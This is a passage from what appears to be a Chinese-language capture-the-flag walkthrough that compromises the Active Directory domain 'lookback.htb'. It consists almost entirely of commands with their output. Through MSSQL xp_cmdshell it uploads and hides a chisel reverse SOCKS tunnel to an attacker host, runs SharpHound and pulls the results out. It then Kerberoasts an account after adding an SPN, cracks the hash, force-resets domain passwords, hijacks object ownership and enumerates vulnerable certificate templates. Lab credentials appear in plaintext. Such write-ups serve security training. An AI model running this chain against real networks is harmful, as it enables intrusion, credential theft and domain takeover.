└─# nxc mssql 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9' --put-file /home/kali/Desktop/tools/chisel/chisel.exe C:\\ProgramData\\chisel.exx
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 (Pwn3d!)
MSSQL       172.16.55.128   1433   DC01             [*] Copy /home/kali/Desktop/tools/chisel/chisel.exe to C:\ProgramData\chisel.exe
MSSQL       172.16.55.128   1433   DC01             [*] Size is 10612224 bytes
MSSQL       172.16.55.128   1433   DC01             [+] File has been uploaded on the remote machine
```

#### run
```sql
SQL (lookback\lookback-admin  dbo@master)> EXEC xp_cmdshell 'cmd /c taskkill /F /IM chisel.exe';
output                                       
------------------------------------------   
ERROR: The process "chisel.exe" not found.   
NULL                                         
SQL (lookback\lookback-admin  dbo@master)> EXEC xp_cmdshell 'powershell -NoP -W Hidden -Command "Start-Process -FilePath ''C:\ProgramData\chisel.exe'' -ArgumentList ''client 172.16.55.193:445 R:socks'' -WindowStyle Hidden"';
output   
------   
NULL     
```

## Sharphound
### upload
```sql
┌──(web)─(root㉿kali)-[/home/kali]
└─# nxc mssql 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9' --put-file '/home/kali/Desktop/tools/sharphound/SharpHound_v2.9.0/SharpHound.ps1' 'C:\Users\db-admin\Desktop\SharpHound.ps1' 
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 (Pwn3d!)
MSSQL       172.16.55.128   1433   DC01             [*] Copy /home/kali/Desktop/tools/sharphound/SharpHound_v2.9.0/SharpHound.ps1 to C:\Users\db-admin\Desktop\SharpHound.ps1
MSSQL       172.16.55.128   1433   DC01             [*] Size is 1618189 bytes
MSSQL       172.16.55.128   1433   DC01             [+] File has been uploaded on the remote machine
```

### run
```sql
┌──(web)─(root㉿kali)-[/home/kali]
└─# impacket-mssqlclient 'lookback.htb/lookback-admin:iPmmhn8bguFcWin9@172.16.55.128' -windows-auth <<SQL
EXEC xp_cmdshell 'if not exist C:\Users\db-admin\Desktop\bh_out mkdir C:\Users\db-admin\Desktop\bh_out'; 
EXEC xp_cmdshell 'powershell -NoP -Ep Bypass -Command "Import-Module ''C:\Users\db-admin\Desktop\SharpHound.ps1''; Invoke-BloodHound -CollectionMethod All -Domain lookback.htb -OutputDirectory C:\Users\db-admin\Desktop\bh_out -ZipFileName 20260410_lookback.zip"';      
EXEC xp_cmdshell 'dir C:\Users\db-admin\Desktop\bh_out';
SQL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(dc01): Line 1: Changed database context to 'master'.
[*] INFO(dc01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (lookback\lookback-admin  dbo@master)> output   
------   
NULL     
SQL (lookback\lookback-admin  dbo@master)>
```

### download
> 需要等一小会脚本运行完毕
>

```sql
┌──(web)─(root㉿kali)-[/home/kali]
└─# nxc mssql 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9' --get-file 'C:\Users\db-admin\Desktop\bh_out\20260410_lookback.zip' '/home/kali/Desktop/hmv/lookback/loot/20260410_lookback.zip'
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 (Pwn3d!)                                                                                                   
MSSQL       172.16.55.128   1433   DC01             [*] Copying "C:\Users\db-admin\Desktop\bh_out\20260410_lookback.zip" to "/home/kali/Desktop/hmv/lookback/loot/20260410_lookback.zip"
MSSQL       172.16.55.128   1433   DC01             [+] File "C:\Users\db-admin\Desktop\bh_out\20260410_lookback.zip" was downloaded to "/home/kali/Desktop/hmv/lookback/loot/20260410_lookback.zip"
```

# Bloodhound
## DB-ADMIN@LOOKBACK.HTB
![](/image/qq%20group/lookback-3.png)

## IT-SEC-ADMIN@LOOKBACK.HTB
![](/image/qq%20group/lookback-4.png)

## IT-ADMIN@LOOKBACK.HTB
![](/image/qq%20group/lookback-5.png)

## IT-LOGIN-USER@LOOKBACK.HTB
![](/image/qq%20group/lookback-6.png)

## 攻击链
> 清晰得不能再清晰了`db-admin -> IT-SEC-admin -> IT-admin -> IT-login-user`
>

![](/image/qq%20group/lookback-7.png)

# ACL 链式攻击
## DB-ADMIN -> IT-SEC-ADMIN（定向 Kerberoast）
> 思路：给 `IT-SEC-admin` 临时加可烤 SPN，取票后离线爆破。  
得到：`IT-SEC-admin : <REDACTED_ITSEC_ADMIN_PASSWORD>`
>

### PowerView
#### upload
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nxc mssql 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9' --put-file '/home/kali/Desktop/tools/PowerSploit/PowerView.ps1' 'C:\Users\db-admin\Desktop\PowerView.ps1'
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 (Pwn3d!)                                                                                                   
MSSQL       172.16.55.128   1433   DC01             [*] Copy /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 to C:\Users\db-admin\Desktop\PowerView.ps1
MSSQL       172.16.55.128   1433   DC01             [*] Size is 770271 bytes
MSSQL       172.16.55.128   1433   DC01             [+] File has been uploaded on the remote machine
```

#### 添加 SPN
```plain
SQL (lookback\lookback-admin  dbo@master)> EXEC xp_cmdshell 'powershell -NoP -Ep Bypass -Command "& { . C:\Users\db-admin\Desktop\PowerView.ps1; Get-DomainUser -Identity IT-SEC-admin | fl samaccountname,serviceprincipalname; Set-DomainObject -Identity IT-SEC-admin -Set @{servicePrincipalName=''http/itsec-admin''}; Get-DomainUser -Identity IT-SEC-admin | fl samaccountname,serviceprincipalname }"'
output                                    
---------------------------------------   
NULL                                      
NULL                                      
samaccountname : IT-SEC-admin             
NULL                                      
NULL                                      
NULL                                      
NULL                                      
NULL                                      
samaccountname       : IT-SEC-admin       
serviceprincipalname : http/itsec-admin   
NULL                                      
NULL                                      
NULL                                      
NULL        
```

### Rubeus
#### upload
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# nxc mssql 172.16.55.128 -d lookback.htb -u lookback-admin -p 'iPmmhn8bguFcWin9' --put-file '/home/kali/Desktop/tools/Rubeus/2.2.0/Rubeus2.2.exe' 'C:\Users\db-admin\Desktop\Rubeus.exe'
MSSQL       172.16.55.128   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (EncryptionReq:False)
MSSQL       172.16.55.128   1433   DC01             [+] lookback.htb\lookback-admin:iPmmhn8bguFcWin9 (Pwn3d!)                                                                                                   
MSSQL       172.16.55.128   1433   DC01             [*] Copy /home/kali/Desktop/tools/Rubeus/2.2.0/Rubeus2.2.exe to C:\Users\db-admin\Desktop\Rubeus.exe
MSSQL       172.16.55.128   1433   DC01             [*] Size is 446976 bytes
MSSQL       172.16.55.128   1433   DC01             [+] File has been uploaded on the remote machine
```

#### run
```plain
SQL (lookback\lookback-admin  dbo@master)> EXEC xp_cmdshell 'C:\Users\db-admin\Desktop\Rubeus.exe kerberoast /user:IT-SEC-admin /simple /nowrap /outfile:C:\Users\db-admin\Desktop\bh_out\itsec_tgs.hash';
output                                                                                                                                                                                                       
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
NULL                                                                                                                                                                                                         
   ______        _                                                                                                                                                                                           
  (_____ \      | |                                                                                                                                                                                          
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                      
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                     
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                     
  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                      
NULL                                                                                                                                                                                                         
  v2.2.0                                                                                                                                                                                                     
NULL                                                                                                                                                                                                         
NULL                                                                                                                                                                                                         
[*] Action: Kerberoasting                                                                                                                                                                                    
NULL                                                                                                                                                                                                         
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.                                                                                                                                            
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.                                                                                                                                 
NULL                                                                                                                                                                                                         
[*] Target User            : IT-SEC-admin                                                                                                                                                                    
[*] Target Domain          : lookback.htb                                                                                                                                                                    
[*] Searching path 'LDAP://dc01.lookback.htb/DC=lookback,DC=htb' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=IT-SEC-admin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'   
NULL                                                                                                                                                                                                         
[*] Total kerberoastable users : 1                                                                                                                                                                           
NULL                                                                                                                                                                                                         
[*] Hash written to C:\Users\db-admin\Desktop\bh_out\itsec_tgs.hash                                                                                                                                          
NULL                                                                                                                                                                                                         
[*] Roasted hashes written to : C:\Users\db-admin\Desktop\bh_out\itsec_tgs.hash                                                                                                                              
NULL     
```

### Gethash
```plain
SQL (lookback\lookback-admin  dbo@master)> EXEC xp_cmdshell 'type C:\Users\db-admin\Desktop\bh_out\itsec_tgs.hash';
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
$krb5tgs$23$*IT-SEC-admin$lookback.htb$http/itsec-admin@lookback.htb*$15B2938BBB018EC0B10522526A1E3CA6$AEF2D06442E183BD6D32B3705B7556EA18ABDD06DDEEB448E9A49E4E1AE21CA823BFC1E57A26B02FCE1B6C107CBEFBE96BF5E6175DFF88A55B1C9075A0ACAF058589FF0B07805FF68849D657   
96DC9FB7B3A9CCEE249068950BF5F838685AA2449D5E8E4A88A75C0A7521177108ADA00B65A6F6AACA6E59972D4F9F3582A5C606D5DDA154E232E0563971C97F37071995147BDE8BBBF29D295FB8549F13961C7A781AD02C8D20D9996954336F82D5DA0C4E42097191D8D71A6617C7ED4933B2E0FF7F3006B97FD2E3399577A   
61B11A2398026511604DB6B818C494ABEFC5C734B79D8BBBE7EC917137D3060A423E3714533EFABD76401977CB66D19C2DD435B4218B4DE2DF76925C4EDD2D94E6FF886ABCCCAC5234ECFF7D51D622DCDA5CA2EDECE98AA7D8DA59FD7F8296E5B619A9BF9D4183CFC5708280FB8CCF21B8A9F4B0D552BB6A3C78A0859060A35   
C34E17C21AD37DD10D2898D78EDEF8E8D48423B79BD915012E77F8A74EC2C61D75CD44BB7F903B47343730F34BEAEE6CAC2758BE44A13B026A48571BBA8C0AB4A7087466C8F611C08608D2294EEBC57C9B0C5661470AEEA820E1616D551F96BAA6D32E9A5631B5C9C5FCE8C0A38C47D2C072DFB0F6A3A418F0675B7F66F6221   
EC2A53C92179FAB9D3E49B096AEC18461E0CBB92730034E4C835B192D3BD3855C4683EAE38F990A2C5C1834F158BDE4AF684D6E66D8C9EC1ACD9CFDB4130053D3DEC7473554B7568F94663104C67161E1B1A7BBC5221D5A44D8F63E612477EB8D610DD53773BAC09DE0F47F46588AE2BE7C052A6070FF74743DE1B3B9CAB7FF   
6550771D358E6586E6E5F098A7E2ED38CF17DD13AF77224BE4D195E0D084043386854C64837AC941D837BD884692ACC2F55E2723957944913C88628193AE567D34BA79A8142329B39FF0E8786217293D9C40385D17104698C866FE7F69EC076E99E60612704FFC5B9B076B09D46C92F3DA9F8A37C1CB3E6EB9CC6B1FC9E7D4B   
7C3BD56996FED0E8424E78A8D749EE56D44EFD0BB893B9203D107F5FD8427BF71218D713BD4F4FC11102131CD79A3A1CC94150B7F36C6F224F360C8A81DC072FB094B43B6237C84D78549A85E91DFB39DFB4CB9938EC62BECBC16D5A8885E8857703AF25054737DB87738E6A78A384A4F18640D52F3250489FD0F6EBFCD39DC   
BA85ED1CA86FB97254C05EBDA575F790F6502A2C07CC52BDC49B1C5118513D06B453460BEA7606A32F1BD602C714451E837DC6B829A8FD586072634B84158FA136B0B0E75CBD040BB686D56BECEEA9F25C19FB2B5DAB9F514D91805CCE95A191E6B6601D7FC91FB6D56D386B53890E0A1FE2C592ED4D0A755B19196F944C551   
F3B08D08635F5256B7B442D18D21D26EB7E0314104750F51CCBBF5BA235879D3BD6A5990C540E91FD65011892804709D7F8FF7071F40E6D9E11A9649499CAE1EA753FFA28FC87038BBEE09DF813EAA24D7BEFD258FF383620C8A693A6666F1091E01FBCB534C74782D5AAECAEC5A6090B4921527ECAA99FFEB316F0956B33A1   
0D489CB09385391B1430CAB31A63952C5CFA7B86920F6B                                                                                                                                                                                                                    
NULL  
```

### Hashcat
> 得到凭据itsec-admin/butterfly
>

```plain
echo '$krb5tgs$23$*IT-SEC-admin$lookback.htb$http/itsec-admin@lookback.htb*$15B2938BBB018EC0B10522526A1E3CA6$AEF2D06442E183BD6D32B3705B7556EA18ABDD06DDEEB448E9A49E4E1AE21CA823BFC1E57A26B02FCE1B6C107CBEFBE96BF5E6175DFF88A55B1C9075A0ACAF058589FF0B07805FF68849D65796DC9FB7B3A9CCEE249068950BF5F838685AA2449D5E8E4A88A75C0A7521177108ADA00B65A6F6AACA6E59972D4F9F3582A5C606D5DDA154E232E0563971C97F37071995147BDE8BBBF29D295FB8549F13961C7A781AD02C8D20D9996954336F82D5DA0C4E42097191D8D71A6617C7ED4933B2E0FF7F3006B97FD2E3399577A61B11A2398026511604DB6B818C494ABEFC5C734B79D8BBBE7EC917137D3060A423E3714533EFABD76401977CB66D19C2DD435B4218B4DE2DF76925C4EDD2D94E6FF886ABCCCAC5234ECFF7D51D622DCDA5CA2EDECE98AA7D8DA59FD7F8296E5B619A9BF9D4183CFC5708280FB8CCF21B8A9F4B0D552BB6A3C78A0859060A35C34E17C21AD37DD10D2898D78EDEF8E8D48423B79BD915012E77F8A74EC2C61D75CD44BB7F903B47343730F34BEAEE6CAC2758BE44A13B026A48571BBA8C0AB4A7087466C8F611C08608D2294EEBC57C9B0C5661470AEEA820E1616D551F96BAA6D32E9A5631B5C9C5FCE8C0A38C47D2C072DFB0F6A3A418F0675B7F66F6221EC2A53C92179FAB9D3E49B096AEC18461E0CBB92730034E4C835B192D3BD3855C4683EAE38F990A2C5C1834F158BDE4AF684D6E66D8C9EC1ACD9CFDB4130053D3DEC7473554B7568F94663104C67161E1B1A7BBC5221D5A44D8F63E612477EB8D610DD53773BAC09DE0F47F46588AE2BE7C052A6070FF74743DE1B3B9CAB7FF6550771D358E6586E6E5F098A7E2ED38CF17DD13AF77224BE4D195E0D084043386854C64837AC941D837BD884692ACC2F55E2723957944913C88628193AE567D34BA79A8142329B39FF0E8786217293D9C40385D17104698C866FE7F69EC076E99E60612704FFC5B9B076B09D46C92F3DA9F8A37C1CB3E6EB9CC6B1FC9E7D4B7C3BD56996FED0E8424E78A8D749EE56D44EFD0BB893B9203D107F5FD8427BF71218D713BD4F4FC11102131CD79A3A1CC94150B7F36C6F224F360C8A81DC072FB094B43B6237C84D78549A85E91DFB39DFB4CB9938EC62BECBC16D5A8885E8857703AF25054737DB87738E6A78A384A4F18640D52F3250489FD0F6EBFCD39DCBA85ED1CA86FB97254C05EBDA575F790F6502A2C07CC52BDC49B1C5118513D06B453460BEA7606A32F1BD602C714451E837DC6B829A8FD586072634B84158FA136B0B0E75CBD040BB686D56BECEEA9F25C19FB2B5DAB9F514D91805CCE95A191E6B6601D7FC91FB6D56D386B53890E0A1FE2C592ED4D0A755B19196F944C551F3B08D08635F5256B7B442D18D21D26EB7E0314104750F51CCBBF5BA235879D3BD6A5990C540E91FD65011892804709D7F8FF7071F40E6D9E11A9649499CAE1EA753FFA28FC87038BBEE09DF813EAA24D7BEFD258FF383620C8A693A6666F1091E01FBCB534C74782D5AAECAEC5A6090B4921527ECAA99FFEB316F0956B33A10D489CB09385391B1430CAB31A63952C5CFA7B86920F6B' > itsec.hash
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# hashcat -m 13100 itsec.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

Host memory allocated for this attack: 513 MB (2151 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*IT-SEC-admin$lookback.htb$http/itsec-admin@lookback.htb*$15b2938bbb018ec0b10522526a1e3ca6$aef2d06442e183bd6d32b3705b7556ea18abdd06ddeeb448e9a49e4e1ae21ca823bfc1e57a26b02fce1b6c107cbefbe96bf5e6175dff88a55b1c9075a0acaf058589ff0b07805ff68849d65796dc9fb7b3a9ccee249068950bf5f838685aa2449d5e8e4a88a75c0a7521177108ada00b65a6f6aaca6e59972d4f9f3582a5c606d5dda154e232e0563971c97f37071995147bde8bbbf29d295fb8549f13961c7a781ad02c8d20d9996954336f82d5da0c4e42097191d8d71a6617c7ed4933b2e0ff7f3006b97fd2e3399577a61b11a2398026511604db6b818c494abefc5c734b79d8bbbe7ec917137d3060a423e3714533efabd76401977cb66d19c2dd435b4218b4de2df76925c4edd2d94e6ff886abcccac5234ecff7d51d622dcda5ca2edece98aa7d8da59fd7f8296e5b619a9bf9d4183cfc5708280fb8ccf21b8a9f4b0d552bb6a3c78a0859060a35c34e17c21ad37dd10d2898d78edef8e8d48423b79bd915012e77f8a74ec2c61d75cd44bb7f903b47343730f34beaee6cac2758be44a13b026a48571bba8c0ab4a7087466c8f611c08608d2294eebc57c9b0c5661470aeea820e1616d551f96baa6d32e9a5631b5c9c5fce8c0a38c47d2c072dfb0f6a3a418f0675b7f66f6221ec2a53c92179fab9d3e49b096aec18461e0cbb92730034e4c835b192d3bd3855c4683eae38f990a2c5c1834f158bde4af684d6e66d8c9ec1acd9cfdb4130053d3dec7473554b7568f94663104c67161e1b1a7bbc5221d5a44d8f63e612477eb8d610dd53773bac09de0f47f46588ae2be7c052a6070ff74743de1b3b9cab7ff6550771d358e6586e6e5f098a7e2ed38cf17dd13af77224be4d195e0d084043386854c64837ac941d837bd884692acc2f55e2723957944913c88628193ae567d34ba79a8142329b39ff0e8786217293d9c40385d17104698c866fe7f69ec076e99e60612704ffc5b9b076b09d46c92f3da9f8a37c1cb3e6eb9cc6b1fc9e7d4b7c3bd56996fed0e8424e78a8d749ee56d44efd0bb893b9203d107f5fd8427bf71218d713bd4f4fc11102131cd79a3a1cc94150b7f36c6f224f360c8a81dc072fb094b43b6237c84d78549a85e91dfb39dfb4cb9938ec62becbc16d5a8885e8857703af25054737db87738e6a78a384a4f18640d52f3250489fd0f6ebfcd39dcba85ed1ca86fb97254c05ebda575f790f6502a2c07cc52bdc49b1c5118513d06b453460bea7606a32f1bd602c714451e837dc6b829a8fd586072634b84158fa136b0b0e75cbd040bb686d56beceea9f25c19fb2b5dab9f514d91805cce95a191e6b6601d7fc91fb6d56d386b53890e0a1fe2c592ed4d0a755b19196f944c551f3b08d08635f5256b7b442d18d21d26eb7e0314104750f51ccbbf5ba235879d3bd6a5990c540e91fd65011892804709d7f8ff7071f40e6d9e11a9649499cae1ea753ffa28fc87038bbee09df813eaa24d7befd258ff383620c8a693a6666f1091e01fbcb534c74782d5aaecaec5a6090b4921527ecaa99ffeb316f0956b33a10d489cb09385391b1430cab31a63952c5cfa7b86920f6b:butterfly
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*IT-SEC-admin$lookback.htb$http/itsec-a...920f6b
Time.Started.....: Sat Apr 11 13:17:13 2026, (0 secs)
Time.Estimated...: Sat Apr 11 13:17:13 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   698.1 kH/s (2.22ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 28%
```

## IT-SEC-admin -> IT-admin（改密）
### rpcclinet
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# rpcclient -U 'lookback.htb/IT-SEC-admin%butterfly' 172.16.55.128 -c "setuserinfo2 IT-admin 23 'V9bT6itAdmin2026'"
```

### netexec
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# nxc smb 172.16.55.128 -d lookback.htb -u IT-admin -p 'V9bT6itAdmin2026' 

SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [+] lookback.htb\IT-admin:V9bT6itAdmin2026
```

## IT-admin -> IT-login-user（接管对象）
### 步骤 1：将 `IT-login-user` 的所有者设置为 `IT-admin`
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u IT-admin -p 'V9bT6itAdmin2026' set owner IT-login-user IT-admin
[+] Old owner S-1-5-21-3830242231-3868280746-2763890440-512 is now replaced by IT-admin on IT-login-user
```

+ **作用**：使 `IT-admin` 成为 `IT-login-user` 对象的**所有者**。
+ **权限要求**：`IT-admin` 需要对目标对象有 `WriteOwner` 权限（或更高）。
+ **攻击意义**：所有者自动获得对对象的 `WriteDacl` 权限，为下一步授予 `GenericAll` 铺路。

### 步骤 2：授予 `IT-admin` 对 `IT-login-user` 的完全控制权 (`GenericAll`)
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u IT-admin -p 'V9bT6itAdmin2026' add genericAll IT-login-user IT-admin
[+] IT-admin has now GenericAll on IT-login-user
```

+ **作用**：赋予 `IT-admin` 对 `IT-login-user` 对象的**完全控制**（包括重置密码、修改属性等）。
+ **前置条件**：步骤 1 成功后，`IT-admin` 作为所有者可以修改 DACL，因此此命令应能执行成功。

### 步骤 3：强制重置 `IT-login-user` 的密码
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u IT-admin -p 'V9bT6itAdmin2026' set password IT-login-user 'ITLogin!2026#Qw'
[+] Password changed successfully!
```

+ **作用**：将 `IT-login-user` 的密码改为 `ITLogin!2026#Qw`。
+ **权限要求**：需要 `GenericAll` 或 `User-Force-Change-Password` 扩展权限。步骤 2 已授予完全控制，故可成功。

### 步骤 4：验证新凭据是否有效（SMB 登录）
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# nxc smb 172.16.55.128 -d lookback.htb -u IT-login-user -p 'ITLogin!2026#Qw'
SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [+] lookback.htb\IT-login-user:ITLogin!2026#Qw 
```

# certipy
> 根据 `certipy find` 的输出，我们发现了一个高价值漏洞模板：`**SubCA**`（模板索引 17）。该模板满足 **ESC1**、**ESC2**、**ESC3** 和 **ESC15** 的条件，且已启用。最关键的是，它允许 **Enrollee Supplies Subject**（请求者指定主题别名），并且支持 **Client Authentication** 扩展密钥用途。这意味着我们可以通过指定 `UPN` 为 `administrator@lookback.htb` 来申请一张代表域管理员的证书，进而通过 Kerberos PKINIT 获取高权限票据
>

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q certipy find -u 'Administrator @lookback.htb' -p 'ITLogin!2026#Qw' -dc-ip 172.16.55.128 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 17 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.55.128@53 answered The DNS operation timed out.; Server Do53:172.16.55.128@53 answered The DNS operation timed out.; Server Do53:172.16.55.128@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'lookback-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'lookback-DC01-CA'
[*] Checking web enrollment for CA 'lookback-DC01-CA' @ 'dc01.lookback.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lookback-DC01-CA
    DNS Name                            : dc01.lookback.htb
    Certificate Subject                 : CN=lookback-DC01-CA, DC=lookback, DC=htb
    Certificate Serial Number           : 4D974861E25474B44FA1690AA7067B52
    Certificate Validity Start          : 2025-10-19 13:42:34+00:00
    Certificate Validity End            : 2030-10-19 13:52:33+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : LOOKBACK.HTB\Administrators
      Access Rights
        ManageCa                        : LOOKBACK.HTB\Administrators
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        ManageCertificates              : LOOKBACK.HTB\Administrators
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Enroll                          : LOOKBACK.HTB\Authenticated Users
    [+] User Enrollable Principals      : LOOKBACK.HTB\Authenticated Users
    [+] User ACL Principals             : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Administrators
                                          LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates
  0
    Template Name                       : IT-login
    Display Name                        : IT-login
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireEmail
                                          SubjectRequireCommonName
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          KDC Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T14:00:38+00:00
    Template Last Modified              : 2025-10-19T14:00:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\IT
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Administrator
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Administrator
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  1
    Template Name                       : login
    Display Name                        : login
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireEmail
                                          SubjectRequireCommonName
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Smart Card Logon
                                          KDC Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:58:21+00:00
    Template Last Modified              : 2025-10-19T13:59:46+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\IT
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Administrator
